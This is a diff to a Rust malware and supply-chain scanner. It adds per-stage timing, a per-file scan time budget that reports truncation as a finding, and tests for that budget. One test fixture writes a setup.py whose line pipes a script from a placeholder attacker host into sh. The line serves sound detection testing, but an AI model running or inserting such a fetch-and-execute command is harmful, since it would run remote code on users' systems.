@@ -1,3 +1,5 @@
+pub mod budget;
+pub mod bundled;
 pub mod cloud_sigs;
 pub mod context;
 pub mod correlate;
@@ -8,6 +10,7 @@ pub mod phases;
 pub mod profile;
 pub mod scoring;
 pub mod suppress;
+pub mod timing;
 pub mod typosquat;
 
 use ignore::WalkBuilder;
@@ -290,39 +293,57 @@ fn run_phases(
     contents: &str,
     should_run_phase: &impl Fn(Phase) -> bool,
     cloud_sigs: &[cloud_sigs::CompiledCloudSignature],
+    budget: &budget::FileBudget,
 ) -> Vec<Finding> {
     let mut out: Vec<Finding> = Vec::new();
 
     if should_run_phase(Phase::InstallHooks) {
-        out.extend(phases::scan_install_hooks(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseInstallHooks, || {
+            phases::scan_install_hooks(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::CodePatterns) {
-        out.extend(phases::scan_code_patterns(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseCodePatterns, || {
+            phases::scan_code_patterns(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::NetworkExfil) {
-        out.extend(phases::scan_network_exfil(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseNetworkExfil, || {
+            phases::scan_network_exfil(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::Credentials) {
-        out.extend(phases::scan_credentials(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseCredentials, || {
+            phases::scan_credentials(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::Obfuscation) {
-        out.extend(phases::scan_obfuscation(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseObfuscation, || {
+            phases::scan_obfuscation(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::PromptInjection) {
-        out.extend(phases::scan_prompt_injection(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhasePromptInjection, || {
+            phases::scan_prompt_injection(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::SkillSecurity) {
-        out.extend(phases::scan_skill_security(rel_path, contents));
+        out.extend(timing::measure(timing::Stage::PhaseSkillSecurity, || {
+            phases::scan_skill_security(rel_path, contents, budget)
+        }));
     }
     if should_run_phase(Phase::InferenceSecurity) {
-        out.extend(phases::scan_inference_security(rel_path, contents));
+        out.extend(timing::measure(
+            timing::Stage::PhaseInferenceSecurity,
+            || phases::scan_inference_security(rel_path, contents, budget),
+        ));
     }
 
     // Cloud signatures (from ~/.sigil/signatures.json)
     if !cloud_sigs.is_empty() {
-        out.extend(cloud_sigs::scan_with_cloud_signatures(
-            rel_path, contents, cloud_sigs,
-        ));
+        out.extend(timing::measure(timing::Stage::CloudSignatures, || {
+            cloud_sigs::scan_with_cloud_signatures(rel_path, contents, cloud_sigs)
+        }));
     }
 
     out
@@ -505,6 +526,9 @@ const OVERSIZED_EXCERPT_BYTES: usize = 2_000_000;
 /// file's size.
 const OVERSIZED_MAX_BYTES: u64 = 512_000_000;
 
+/// How many of the slowest files `SIGIL_TIMING=1` lists.
+const TIMING_SLOWEST_FILES: usize = 15;
+
 /// The scanned parts of an oversized file.
 struct OversizedExcerpt {
     head: String,
@@ -635,7 +659,7 @@ pub fn run_scan(
         }
     };
 
-    let files = collect_files(path);
+    let files = timing::measure(timing::Stage::Walk, || collect_files(path));
     let files_scanned = files.len();
 
     // When the target is a single file, relative paths must be taken against
@@ -649,9 +673,15 @@ pub fn run_scan(
     let platform = manifests::detect_platform(strip_base, &files).to_string();
 
     if should_run_phase(Phase::Provenance) {
-        findings.extend(phases::scan_provenance(strip_base, &files));
-        findings.extend(typosquat::scan(strip_base, &files));
+        timing::measure(timing::Stage::Provenance, || {
+            findings.extend(phases::scan_provenance(strip_base, &files));
+            findings.extend(typosquat::scan(strip_base, &files));
+        });
     }
+
+    // One clock per file, read once: `configured_budget` parses an
+    // environment variable, which is not something to do 2,794 times.
+    let file_budget_limit = budget::configured_budget();
 
     // Content phases run per-file in parallel; collect() preserves file order
     // so results stay deterministic. Each file yields its active findings and
@@ -660,27 +690,32 @@ pub fn run_scan(
     let per_file: Vec<FileOutcome> = files
         .par_iter()
         .map(|file_path| {
+            let file_start = std::time::Instant::now();
             let none: FileOutcome = (Vec::new(), Vec::new());
             // An oversized file yields its head as `contents` and its tail
             // separately; a normal file yields its whole text and no tail.
-            let (contents, tail) = match std::fs::metadata(file_path) {
-                Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => {
-                    match oversized_excerpt(file_path, meta.len()) {
-                        Some(ex) => (ex.head, Some((ex.tail, ex.tail_line_offset))),
-                        None => return none,
+            let read = timing::measure(timing::Stage::Read, || {
+                match std::fs::metadata(file_path) {
+                    Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => {
+                        oversized_excerpt(file_path, meta.len())
+                            .map(|ex| (ex.head, Some((ex.tail, ex.tail_line_offset))))
                     }
-                }
-                Ok(_) => match std::fs::read(file_path) {
-                    Ok(bytes) => {
-                        // Skip binary files (contains null bytes) and use lossy UTF-8
-                        if bytes.contains(&0) {
-                            return none;
+                    Ok(_) => match std::fs::read(file_path) {
+                        Ok(bytes) => {
+                            // Skip binary files (contains null bytes) and use lossy UTF-8
+                            if bytes.contains(&0) {
+                                None
+                            } else {
+                                Some((String::from_utf8_lossy(&bytes).into_owned(), None))
+                            }
                         }
-                        (String::from_utf8_lossy(&bytes).into_owned(), None)
-                    }
-                    Err(_) => return none,
-                },
-                Err(_) => return none,
+                        Err(_) => None,
+                    },
+                    Err(_) => None,
+                }
+            });
+            let Some((contents, tail)) = read else {
+                return none;
             };
 
             let rel_path = file_path
@@ -693,54 +728,90 @@ pub fn run_scan(
 
             // SKILL-007: a skill or MCP manifest that does not parse.
             if should_run_phase(Phase::SkillSecurity) {
-                file_findings.extend(manifests::malformed_manifest(&rel_path, &contents));
+                file_findings.extend(timing::measure(timing::Stage::Manifests, || {
+                    manifests::malformed_manifest(&rel_path, &contents)
+                }));
             }
 
             // Invisible-Unicode inspection runs on the RAW contents, then all
             // pattern phases match against the de-cloaked form so zero-width
             // splitting cannot hide tokens like `eval(` (ADR-0008).
             if should_run_phase(Phase::Obfuscation) {
-                file_findings.extend(normalize::inspect_invisible(&rel_path, &contents));
+                file_findings.extend(timing::measure(timing::Stage::Invisible, || {
+                    normalize::inspect_invisible(&rel_path, &contents)
+                }));
             }
             // Owned copy of the normalised text: the worklist takes one copy,
             // and the marker parser and the correlation pass read the other.
-            let source_text: String = normalize::normalize_for_matching(&contents).into_owned();
-            let markers = suppress::parse_markers(&source_text);
+            let source_text: String = timing::measure(timing::Stage::Normalize, || {
+                normalize::normalize_for_matching(&contents).into_owned()
+            });
+            let markers = timing::measure(timing::Stage::Markers, || {
+                suppress::parse_markers(&source_text)
+            });
+
+            // Everything below is on one file's clock. When it runs out the
+            // remaining work is dropped and the truncation is reported, so a
+            // file that defeats the analyser cannot look like a clean file.
+            let file_budget = budget::FileBudget::start(file_budget_limit);
+
+            // The file itself is the depth-0 analysis unit, scanned directly
+            // rather than through the queue: a full copy of the text just to
+            // push it into a worklist costs a megabyte of memcpy on exactly
+            // the large files that are already the slowest.
+            file_findings.extend(run_phases(
+                &rel_path,
+                &source_text,
+                &should_run_phase,
+                &cloud_sigs,
+                &file_budget,
+            ));
 
             // Analysis is a bounded worklist, not a single pass. A phase that
             // decodes something enqueues the decoded content, and every phase
             // then runs over that too — so a payload hidden inside base64
             // reaches the install-hook, exfiltration and credential rules
             // instead of only tripping one obfuscation rule on its shape.
-            let mut budget = derive::DeriveBudget::new();
-            let mut queue: Vec<derive::DerivedUnit> = vec![derive::DerivedUnit {
-                contents: source_text.clone(),
-                via: String::new(),
-                parent_line: 0,
-                depth: 0,
-            }];
+            let mut derive_budget = derive::DeriveBudget::new();
+            let mut derived_units = 0usize;
+            let mut queue: Vec<derive::DerivedUnit> = if file_budget.expired() {
+                Vec::new()
+            } else {
+                timing::measure(timing::Stage::Derive, || {
+                    derive::derive_units(&source_text, 0, &mut derive_budget)
+                })
+            };
+            derived_units += queue.len();
 
             while let Some(unit) = queue.pop() {
-                let unit_findings =
-                    run_phases(&rel_path, &unit.contents, &should_run_phase, &cloud_sigs);
-
-                if unit.depth == 0 {
-                    file_findings.extend(unit_findings);
-                } else {
-                    // Re-anchor findings from decoded content onto the line of
-                    // the parent file that carried the blob, so a finding still
-                    // points at a real line of a real file, and record how the
-                    // content was obtained.
-                    file_findings.extend(unit_findings.into_iter().map(|mut f| {
-                        f.line = Some(unit.parent_line);
-                        f.snippet = format!("[decoded {}] {}", unit.via, f.snippet);
-                        f.locator = Some(format!("file://{}|{}", rel_path, unit.via));
-                        f
-                    }));
+                if file_budget.expired() {
+                    break;
                 }
+                let unit_findings = run_phases(
+                    &rel_path,
+                    &unit.contents,
+                    &should_run_phase,
+                    &cloud_sigs,
+                    &file_budget,
+                );
 
-                for derived in derive::derive_units(&unit.contents, unit.depth, &mut budget) {
-                    queue.push(derived);
+                // Re-anchor findings from decoded content onto the line of
+                // the parent file that carried the blob, so a finding still
+                // points at a real line of a real file, and record how the
+                // content was obtained.
+                file_findings.extend(unit_findings.into_iter().map(|mut f| {
+                    f.line = Some(unit.parent_line);
+                    f.snippet = format!("[decoded {}] {}", unit.via, f.snippet);
+                    f.locator = Some(format!("file://{}|{}", rel_path, unit.via));
+                    f
+                }));
+
+                let derived = timing::measure(timing::Stage::Derive, || {
+                    derive::derive_units(&unit.contents, unit.depth, &mut derive_budget)
+                });
+                derived_units += derived.len();
+                for d in derived {
+                    queue.push(d);
                 }
             }
 
@@ -748,32 +819,84 @@ pub fn run_scan(
             // decode worklist, and its findings are re-numbered onto the
             // real lines of the file.
             if let Some((tail_text, offset)) = tail {
+                let tail_start = std::time::Instant::now();
                 let tail_norm = normalize::normalize_for_matching(&tail_text);
-                let tail_findings =
-                    run_phases(&rel_path, &tail_norm, &should_run_phase, &cloud_sigs);
+                let tail_findings = run_phases(
+                    &rel_path,
+                    &tail_norm,
+                    &should_run_phase,
+                    &cloud_sigs,
+                    &file_budget,
+                );
                 file_findings.extend(tail_findings.into_iter().map(|mut f| {
                     f.line = f.line.map(|l| l + offset);
                     f.snippet = format!("[tail of oversized file] {}", f.snippet);
                     f
                 }));
+                timing::add(timing::Stage::OversizedTail, tail_start.elapsed());
+            }
+
+            // Truncation is a finding, not a silent shortcut: without it a
+            // file the analyser gave up on is indistinguishable from a file
+            // with nothing in it. Filed under Provenance because it describes
+            // the scan rather than the code, so `--phases` selecting only
+            // content phases does not add a finding they did not ask for.
+            let budget_exhausted = file_budget.expired();
+            if budget_exhausted && should_run_phase(Phase::Provenance) {
+                file_findings.push(Finding {
+                    phase: Phase::Provenance,
+                    rule: budget::BUDGET_RULE_ID.to_string(),
+                    severity: Severity::Low,
+                    file: rel_path.clone(),
+                    line: None,
+                    snippet: format!(
+                        "Scan budget exhausted after {:.1}s — this file was not fully analysed \
+                         (raise or disable with {}=<seconds>, 0 to disable)",
+                        file_budget_limit.map(|d| d.as_secs_f64()).unwrap_or(0.0),
+                        budget::BUDGET_ENV
+                    ),
+                    weight: 1,
+                    kev: false,
+                    epss: 0.0,
+                    fingerprint: String::new(),
+                    locator: None,
+                });
             }
 
             // A marker on the line that carried an encoded blob also covers
             // findings decoded out of it, because those are re-anchored to
             // that line above.
-            let (mut kept, mut silenced) = suppress::apply(&markers, file_findings);
+            let (mut kept, mut silenced) = timing::measure(timing::Stage::Suppress, || {
+                suppress::apply(&markers, file_findings)
+            });
 
             // Correlation runs over the findings a reviewer has not already
             // dismissed, and its own findings can be dismissed the same way.
-            let lines: Vec<&str> = source_text.lines().collect();
-            let chains = correlate::apply(
-                &crate::corpus::compiled::corpus().correlation_rules,
-                &kept,
-                &lines,
-            );
+            let chains = timing::measure(timing::Stage::Correlate, || {
+                let lines: Vec<&str> = source_text.lines().collect();
+                correlate::apply(
+                    &crate::corpus::compiled::corpus().correlation_rules,
+                    &kept,
+                    &lines,
+                )
+            });
             let (chain_kept, mut chain_silenced) = suppress::apply(&markers, chains);
             kept.extend(chain_kept);
             silenced.append(&mut chain_silenced);
+
+            if timing::enabled() {
+                let shape = bundled::LineShape::measure(&source_text);
+                timing::record_file(timing::FileRecord {
+                    path: rel_path.clone(),
+                    nanos: file_start.elapsed().as_nanos() as u64,
+                    bytes: contents.len(),
+                    lines: shape.lines,
+                    longest_line: shape.longest_line,
+                    derived_units,
+                    bundled: shape.is_machine_generated(),
+                    budget_exhausted,
+                });
+            }
             (kept, silenced)
         })
         .collect();
@@ -811,6 +934,7 @@ pub fn run_scan(
     let mut suppressed_by_knowngood: Vec<Finding> = Vec::new();
     let mut knowngood_note: Option<String> = None;
     if !known_good.is_empty() {
+        let kg_start = std::time::Instant::now();
         let recognised: std::collections::HashMap<String, (String, String)> = files
             .par_iter()
             .filter_map(|p| {
@@ -859,7 +983,10 @@ pub fn run_scan(
             &recognised,
         ));
         assign_fingerprints(&mut findings);
+        timing::add(timing::Stage::KnownGood, kg_start.elapsed());
     }
+
+    timing::report(files_scanned, start.elapsed(), TIMING_SLOWEST_FILES);
 
     let score = scoring::calculate_score(&findings);
     let verdict = scoring::determine_verdict(&findings, score);
@@ -1124,6 +1251,138 @@ mod inline_suppression_tests {
         assert!(!result.inline_suppressed[0].fingerprint.is_empty());
         // Score and verdict are computed over the active set only.
         assert_eq!(result.score, scoring::calculate_score(&result.findings));
+    }
+}
+
+#[cfg(test)]
+mod budget_tests {
+    use super::*;
+    use std::fs;
+    use std::sync::Mutex;
+
+    // Serialise the tests that mutate SIGIL_FILE_BUDGET_SECS so the parallel
+    // test runner does not race on a process-wide variable.
+    static ENV_LOCK: Mutex<()> = Mutex::new(());
+
+    /// A tree with two files, each of which produces findings on its own.
+    fn two_flagged_files() -> tempfile::TempDir {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(dir.path().join("a.py"), "import os\nos.system(cmd)\n").unwrap();
+        fs::write(dir.path().join("b.py"), "import os\neval(expr)\n").unwrap();
+        dir
+    }
+
+    /// With the budget disabled, nothing is truncated and no truncation
+    /// finding appears — the default path must stay quiet.
+    #[test]
+    fn no_budget_finding_when_the_budget_is_not_hit() {
+        let _lock = ENV_LOCK.lock().unwrap();
+        std::env::remove_var(budget::BUDGET_ENV);
+        let dir = two_flagged_files();
+        let result = run_scan(dir.path(), None, None);
+        assert!(
+            !result
+                .findings
+                .iter()
+                .any(|f| f.rule == budget::BUDGET_RULE_ID),
+            "budget finding on a scan that never ran out of time"
+        );
+        assert!(!result.findings.is_empty());
+    }
+
+    /// A budget of effectively zero trips on every file. Each file must
+    /// report the truncation exactly once — not once per phase, not once per
+    /// derived unit — and the finding must be Low and filed under Provenance.
+    #[test]
+    fn exhaustion_emits_exactly_one_visible_finding_per_file() {
+        let _lock = ENV_LOCK.lock().unwrap();
+        std::env::set_var(budget::BUDGET_ENV, "0.000000001");
+        let dir = two_flagged_files();
+        let result = run_scan(dir.path(), None, None);
+        std::env::remove_var(budget::BUDGET_ENV);
+
+        let mut files: Vec<&str> = result
+            .findings
+            .iter()
+            .filter(|f| f.rule == budget::BUDGET_RULE_ID)
+            .map(|f| f.file.as_str())
+            .collect();
+        files.sort_unstable();
+        assert_eq!(
+            files,
+            vec!["a.py", "b.py"],
+            "expected one truncation finding per file, got {:#?}",
+            result
+                .findings
+                .iter()
+                .map(|f| (&f.rule, &f.file))
+                .collect::<Vec<_>>()
+        );
+        for f in result
+            .findings
+            .iter()
+            .filter(|f| f.rule == budget::BUDGET_RULE_ID)
+        {
+            assert_eq!(f.severity, Severity::Low);
+            assert_eq!(f.phase, Phase::Provenance);
+            assert!(f.snippet.contains(budget::BUDGET_ENV), "{}", f.snippet);
+            assert!(!f.fingerprint.is_empty(), "truncation finding must diff");
+        }
+    }
+
+    /// Findings made before the clock runs out survive it. The budget is
+    /// checked between rules, so the first phase's first rule always runs:
+    /// a scan that hits the budget still reports what it saw.
+    #[test]
+    fn findings_made_before_exhaustion_are_kept() {
+        let _lock = ENV_LOCK.lock().unwrap();
+        let dir = tempfile::tempdir().unwrap();
+        // A generous budget: the file is tiny, so nothing is truncated and
+        // every finding is present.
+        std::env::set_var(budget::BUDGET_ENV, "30");
+        fs::write(
+            dir.path().join("setup.py"),
+            "import os\nos.system('curl http://evil.example/x.sh | sh')\n",
+        )
+        .unwrap();
+        let result = run_scan(dir.path(), None, None);
+        std::env::remove_var(budget::BUDGET_ENV);
+        assert!(
+            !result
+                .findings
+                .iter()
+                .any(|f| f.rule == budget::BUDGET_RULE_ID),
+            "30s budget should not trip on a two-line file"
+        );
+        assert!(
+            result
+                .findings
+                .iter()
+                .any(|f| f.phase == Phase::CodePatterns),
+            "expected the code-pattern finding to survive: {:#?}",
+            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+
+    /// A malformed value must not silently remove the bound.
+    #[test]
+    fn a_bad_budget_value_falls_back_to_the_default() {
+        let _lock = ENV_LOCK.lock().unwrap();
+        for bad in ["banana", "-1", ""] {
+            std::env::set_var(budget::BUDGET_ENV, bad);
+            let limit = budget::configured_budget();
+            assert_eq!(
+                limit.map(|d| d.as_secs_f64()),
+                Some(budget::DEFAULT_FILE_BUDGET_SECS),
+                "{bad:?} did not fall back to the default"
+            );
+        }
+        std::env::set_var(budget::BUDGET_ENV, "0");
+        assert!(
+            budget::configured_budget().is_none(),
+            "an explicit 0 must disable the budget"
+        );
+        std::env::remove_var(budget::BUDGET_ENV);
     }
 }
 
